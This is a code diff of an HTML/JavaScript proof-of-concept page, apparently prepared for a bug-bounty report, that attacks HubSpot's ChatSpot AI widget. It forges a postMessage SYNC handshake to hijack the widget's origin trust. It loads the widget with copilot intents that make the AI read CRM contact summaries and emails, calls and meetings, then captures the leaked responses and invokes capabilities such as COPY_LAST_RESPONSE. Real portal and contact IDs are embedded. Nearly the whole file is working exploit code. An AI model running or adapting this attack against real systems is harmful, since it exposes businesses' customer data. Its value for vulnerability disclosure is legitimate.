@@ -13,45 +13,66 @@
   .data    { color: #f80; white-space: pre-wrap; word-break: break-all; }
   .error   { color: #f00; }
   .write   { color: #f0f; }
-  #controls { position: absolute; top: 10px; right: 10px; z-index: 9999; }
-  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; margin: 2px; font-family: monospace; font-size: 11px; }
+  #controls { position: absolute; top: 10px; right: 10px; z-index: 9999; display: flex; flex-wrap: wrap; gap: 4px; max-width: 360px; justify-content: flex-end; }
+  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; font-family: monospace; font-size: 11px; }
   button:hover { background: #0f0; color: #000; }
   #status-bar { padding: 4px 10px; background: #1a1a1a; font-size: 11px; border-bottom: 1px solid #333; }
+  #config { padding: 8px 10px; background: #151515; border-bottom: 1px solid #333; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; font-size: 11px; }
+  #config label { color: #aaa; }
+  #config input, #config select { background: #222; color: #eee; border: 1px solid #444; padding: 2px 6px; font-family: monospace; font-size: 11px; }
+  #config input { width: 140px; }
 </style>
 </head>
 <body>
 
-<div id="status-bar">ChatSpot postMessage SYNC Origin Hijack PoC — H1 #3627983 re-report | Portal: <span id="portal-display">146256700</span> | Status: <span id="status-text" class="status">INITIALIZING</span></div>
+<div id="status-bar">
+  ChatSpot postMessage SYNC Origin Hijack PoC | Portal: <span id="portal-display">146256700</span> | Status: <span id="status-text" class="status">IDLE</span>
+</div>
+
+<div id="config">
+  <label>Portal ID: <input id="portalId" value="146256700"></label>
+  <label>Object ID: <input id="objectId" value="739644991696"></label>
+  <label>Object Type:
+    <select id="objectTypeId">
+      <option value="0-1">0-1 — Contact</option>
+      <option value="0-2">0-2 — Company</option>
+      <option value="0-3">0-3 — Deal</option>
+    </select>
+  </label>
+  <label>Object Name: <input id="objectName" value="Figma Elastic"></label>
+</div>
 
 <div id="log">
-  <div class="status">[INIT] PoC loaded. Building iframe...</div>
+  <div class="status">[INIT] PoC loaded. Configure above and click a READ button or use auto-launch.</div>
 </div>
 
 <div id="iframe-container">
   <div id="controls">
     <button onclick="testReadSummary()">READ: object_summary</button>
     <button onclick="testReadEngagements()">READ: engagements_summary</button>
+    <button onclick="sendSetComponentState()">SEND: SET_COMPONENT_STATE</button>
     <button onclick="sendCopyLastResponse()">SEND: COPY_LAST_RESPONSE</button>
+    <button onclick="sendSync()">RE-SEND SYNC</button>
+    <button onclick="resetPoc()">RESET</button>
     <button onclick="clearLog()">CLR LOG</button>
   </div>
 </div>
 
 <script>
-const PORTAL_ID = '146256700';
-const TARGET_CONTACT_ID = '739644991696';   // hhjjjjjhhhh@gmail.com — test contact
-const TARGET_TYPE = 'CONTACT';
+// ── State ──────────────────────────────────────────────────────────────────
 const HS_IFR = '__hs-ifr';
-
-let iframeEl = null;
-let chatspotId = null;
+let iframeEl      = null;
+let chatspotId    = null;
+let embedId       = null;
 let originTrusted = false;
-let msgCount = 0;
+let msgCount      = 0;
 let capturedResponses = [];
 
+// ── Helpers ────────────────────────────────────────────────────────────────
 function log(msg, cls = '') {
   const div = document.getElementById('log');
-  const ts = new Date().toISOString().split('T')[1].split('.')[0];
-  const el = document.createElement('div');
+  const ts  = new Date().toISOString().split('T')[1].split('.')[0];
+  const el  = document.createElement('div');
   if (cls) el.className = cls;
   el.textContent = `[${ts}] ${msg}`;
   div.appendChild(el);
@@ -66,164 +87,219 @@ function clearLog() {
   document.getElementById('log').innerHTML = '';
 }
 
+function getConfig() {
+  const objectTypeId    = document.getElementById('objectTypeId').value;
+  const objectTypeLabel = objectTypeId === '0-1' ? 'Contact' : objectTypeId === '0-2' ? 'Company' : 'Deal';
+  return {
+    portalId:       document.getElementById('portalId').value,
+    objectId:       document.getElementById('objectId').value,
+    objectTypeId,
+    objectTypeLabel,
+    objectName:     document.getElementById('objectName').value,
+  };
+}
+
 function buildCopilotAction(intent, extra = {}) {
   return encodeURIComponent(JSON.stringify(Object.assign({ intent }, extra)));
 }
 
-function loadChatspot(copilotActionJson) {
-  const existing = document.getElementById('chatspot-iframe');
-  if (existing) existing.remove();
-  chatspotId = null;
-  originTrusted = false;
+// ── Core: load iframe ──────────────────────────────────────────────────────
+function loadChatspot(copilotActionEncoded) {
+  resetPoc(false);
+  const cfg = getConfig();
+  document.getElementById('portal-display').textContent = cfg.portalId;
 
-  const action = buildCopilotAction('object_engagements_summary', {
-    objectId: TARGET_CONTACT_ID,
-    objectType: TARGET_TYPE
-  });
-
-  const src = `https://app-eu1.hubspot.com/chatspot-widget-ui/${PORTAL_ID}/chat`
-    + `?copilotAction=${copilotActionJson || action}`
+  const src = `https://app-eu1.hubspot.com/chatspot-widget-ui/${cfg.portalId}/chat`
+    + `?copilotAction=${copilotActionEncoded}`
     + `&hostAppName=attacker-page`
     + `&copilotThreadId=exfil-${Date.now()}`;
 
-  log(`Building iframe: ${src.substring(0, 120)}...`, 'status');
+  log(`Building iframe: ${src.substring(0, 140)}...`, 'status');
+  setStatus('LOADING');
 
   iframeEl = document.createElement('iframe');
-  iframeEl.id = 'chatspot-iframe';
-  iframeEl.src = src;
-  iframeEl.allow = 'microphone; camera';  // demonstrate permission delegation surface
+  iframeEl.id   = 'chatspot-iframe';
+  iframeEl.src  = src;
+  iframeEl.allow = 'microphone; camera';
   iframeEl.style.cssText = 'width:100%;height:100%;border:none;';
   document.getElementById('iframe-container').appendChild(iframeEl);
 
+  // Send SYNC after load — use same 1 s delay that the working PoC uses
   iframeEl.addEventListener('load', () => {
-    log('Iframe loaded. Sending SYNC to steal origin trust...', 'status');
-    sendSync();
+    log('Iframe loaded. Sending SYNC in 1 s...', 'status');
+    setStatus('IFRAME LOADED');
+    setTimeout(sendSync, 1000);
   });
 }
 
+// ── SYNC handshake (from PoC #2 — the one that actually works) ─────────────
 function sendSync() {
   if (!iframeEl || !iframeEl.contentWindow) {
     log('ERROR: iframe not ready', 'error');
     return;
   }
+  embedId = crypto.randomUUID();
   const syncMsg = {
-    format: HS_IFR,
-    from: 'attacker-host',
-    to: chatspotId || '*',
-    id: `sync-attacker-${Date.now()}`,
-    v: 1,
+    id:      crypto.randomUUID(),
+    format:  HS_IFR,
+    from:    'HOST',
+    to:      embedId,
+    v:       1,
     payload: {
-      type: 'SYNC',
-      host: window.location.origin,
-      embedId: `attacker-${Date.now()}`,
-      group: 'attacker-group'
+      type:          'SYNC',
+      embedId,
+      group:         'iframeable',
+      name:          'embed',
+      appData:       {},
+      embeddedProps: {}
     }
   };
-  log('→ Sending SYNC: ' + JSON.stringify(syncMsg).substring(0, 80) + '...', 'status');
+  log('→ Sending SYNC: ' + JSON.stringify(syncMsg).substring(0, 120) + '...', 'status');
   iframeEl.contentWindow.postMessage(syncMsg, '*');
 }
 
-function sendHsIfrMessage(type, payload = {}) {
+// ── Generic __hs-ifr message sender ───────────────────────────────────────
+function sendHsIfrMessage(payloadType, extra = {}) {
   if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
-  if (!originTrusted) { log('Origin not yet trusted — send SYNC first', 'error'); return; }
+  if (!originTrusted) { log('Origin not yet trusted — waiting for SYNC_ACK first', 'error'); return; }
   const msg = {
+    id:     crypto.randomUUID(),
     format: HS_IFR,
-    from: 'attacker-host',
-    to: chatspotId || '*',
-    id: `msg-${type}-${Date.now()}`,
-    v: 1,
-    payload: Object.assign({ type }, payload)
+    from:   'HOST',
+    to:     chatspotId || '*',
+    v:      1,
+    payload: Object.assign({ type: payloadType }, extra)
   };
-  log('→ Sending ' + type + ': ' + JSON.stringify(payload).substring(0, 60), 'write');
+  log('→ Sending ' + payloadType + ': ' + JSON.stringify(extra).substring(0, 80), 'write');
   iframeEl.contentWindow.postMessage(msg, '*');
 }
 
+// ── Button actions ─────────────────────────────────────────────────────────
 function testReadSummary() {
+  const cfg = getConfig();
   const action = buildCopilotAction('object_summary', {
-    objectId: TARGET_CONTACT_ID,
-    objectTypeId: '0-1',
-    objectTypeLabel: 'Contact',
-    summaryType: 'DEFAULT'
+    objectId:       cfg.objectId,
+    objectTypeId:   cfg.objectTypeId,
+    objectTypeLabel: cfg.objectTypeLabel,
+    objectName:     cfg.objectName,
+    label:          cfg.objectTypeLabel,
+    summaryType:    'STANDARD'
   });
   log('--- Reloading with intent: object_summary ---', 'status');
   loadChatspot(action);
 }
 
 function testReadEngagements() {
+  const cfg = getConfig();
   const action = buildCopilotAction('object_engagements_summary', {
-    objectId: TARGET_CONTACT_ID,
-    objectType: TARGET_TYPE
+    objectId:   cfg.objectId,
+    objectType: cfg.objectTypeLabel.toUpperCase()
   });
   log('--- Reloading with intent: object_engagements_summary ---', 'status');
   loadChatspot(action);
 }
 
-function sendCopyLastResponse() {
-  // Try to get the AI response text sent back to us
-  sendHsIfrMessage('INVOKE_CAPABILITY', {
-    type: 'INVOKE_CAPABILITY',
-    name: 'COPY_LAST_RESPONSE',
-    source: 'attacker',
-    args: {}
+function sendSetComponentState() {
+  sendHsIfrMessage('SET_COMPONENT_STATE', {
+    updates: {
+      isOpen:           true,
+      isReady:          true,
+      isLoaded:         true,
+      isDisabled:       false,
+      isFullscreenMode: false
+    },
+    target: 'nav-components:chatspot-sidebar'
   });
 }
 
-// Main message listener
+function sendCopyLastResponse() {
+  sendHsIfrMessage('INVOKE_CAPABILITY', {
+    name:   'COPY_LAST_RESPONSE',
+    source: 'attacker',
+    args:   {}
+  });
+}
+
+function resetPoc(doLog = true) {
+  if (iframeEl) iframeEl.remove();
+  iframeEl      = null;
+  chatspotId    = null;
+  embedId       = null;
+  originTrusted = false;
+  msgCount      = 0;
+  setStatus('IDLE');
+  if (doLog) log('--- RESET ---', 'status');
+}
+
+// ── Main message listener ──────────────────────────────────────────────────
 window.addEventListener('message', e => {
   if (!e.data) return;
 
-  // Handle __hs-ifr protocol messages
-  if (e.data && e.data.format === HS_IFR) {
-    msgCount++;
-    const payload = e.data.payload || {};
-    const msgType = payload.type || e.data.type || '(unknown)';
-
-    log(`← [#${msgCount}] ${msgType} from ${e.origin}`, 'status');
-
-    if (payload.chatspotId || e.data.id) {
-      const id = payload.chatspotId || e.data.from || e.data.id;
-      if (id && !chatspotId) {
-        chatspotId = id;
-        log(`  chatspotId captured: ${chatspotId}`, 'status');
-      }
-    }
-
-    if (msgType === 'SYNC_ACK' || msgType === 'SYNC-ACK') {
-      originTrusted = true;
-      setStatus('SYNC HIJACKED ✓');
-      log('*** ORIGIN TRUST ESTABLISHED — attacker is now trusted parent ***', 'trusted');
-      log(`  Widget believes its parent is: ${window.location.origin}`, 'trusted');
-    }
-
-    if (msgType === 'READY') {
-      log('Widget READY — copilotAction being processed by AI...', 'trusted');
-    }
-
-    // Capture any response data that leaks to us
-    const raw = JSON.stringify(e.data, null, 2);
-    if (raw.length > 100) {
-      capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
-      log(`  DATA (${raw.length} bytes): ${raw.substring(0, 200)}...`, 'data');
+  // Only handle __hs-ifr protocol
+  if (e.data.format !== HS_IFR) {
+    const raw = JSON.stringify(e.data);
+    if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
+      log(`← NON-IFR msg from ${e.origin}: ${raw.substring(0, 150)}`, 'data');
     }
     return;
   }
 
-  // Non-hs-ifr messages (could be copilot response events leaking out)
-  const raw = JSON.stringify(e.data);
-  if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
-    log(`← NON-IFR msg from ${e.origin}: ${raw.substring(0, 150)}`, 'data');
+  msgCount++;
+  const payload = e.data.payload || {};
+  const msgType = payload.type || e.data.type || '(unknown)';
+
+  log(`← [#${msgCount}] ${msgType} from ${e.origin}`, 'status');
+
+  // Capture chatspotId from any incoming message
+  const senderId = e.data.from;
+  if (senderId && !chatspotId) {
+    chatspotId = senderId;
+    log(`  chatspotId captured: ${chatspotId}`, 'status');
+  }
+
+  // ── SYNC_ACK: trust established ──
+  if (msgType === 'SYNC_ACK' || msgType === 'SYNC-ACK') {
+    chatspotId    = e.data.from || chatspotId;
+    originTrusted = true;
+    setStatus('SYNC HIJACKED ✓');
+    log('*** ORIGIN TRUST ESTABLISHED — attacker is now trusted parent ***', 'trusted');
+    log(`  Widget believes its parent is: ${window.location.origin}`, 'trusted');
+    log(`  chatspotId: ${chatspotId}`, 'trusted');
+  }
+
+  // ── READY: widget is up, push component state ──
+  if (msgType === 'READY') {
+    log('Widget READY — sending SET_COMPONENT_STATE...', 'trusted');
+    sendSetComponentState();
+  }
+
+  // ── INVOKE_CAPABILITY: track capability calls ──
+  if (msgType === 'INVOKE_CAPABILITY') {
+    log(`  CAP triggered: ${payload.name}`, 'trusted');
+
+    // Confirm AI pipeline fired
+    if (payload.name === 'UPDATE_QUERY_PARAM_CAP'
+        && payload.args?.key === 'copilotAction'
+        && payload.args?.value === '') {
+      log('  AI FIRED — AI pipeline triggered, CRM data being read', 'trusted');
+    }
+  }
+
+  // Log any substantial data payloads
+  const raw = JSON.stringify(e.data, null, 2);
+  if (raw.length > 100) {
     capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
+    log(`  DATA (${raw.length} bytes): ${raw.substring(0, 250)}...`, 'data');
   }
 });
 
-// Auto-start with object_engagements_summary
+// Auto-launch on load
 document.addEventListener('DOMContentLoaded', () => {
-  log(`Target portal: ${PORTAL_ID}`, 'status');
-  log(`Target contact: ${TARGET_CONTACT_ID} (${TARGET_TYPE})`, 'status');
+  const cfg = getConfig();
+  log(`Target portal:  ${cfg.portalId}`, 'status');
+  log(`Target object:  ${cfg.objectId} (${cfg.objectTypeLabel})`, 'status');
   log('Attack: first-message-wins SYNC origin trust bypass', 'status');
-  log('Payload: object_engagements_summary (reads all emails/calls/meetings)', 'status');
-  log('', '');
-  loadChatspot();
+  log('Click READ: object_summary or READ: engagements_summary to start.', 'status');
 });
 </script>
 </body>
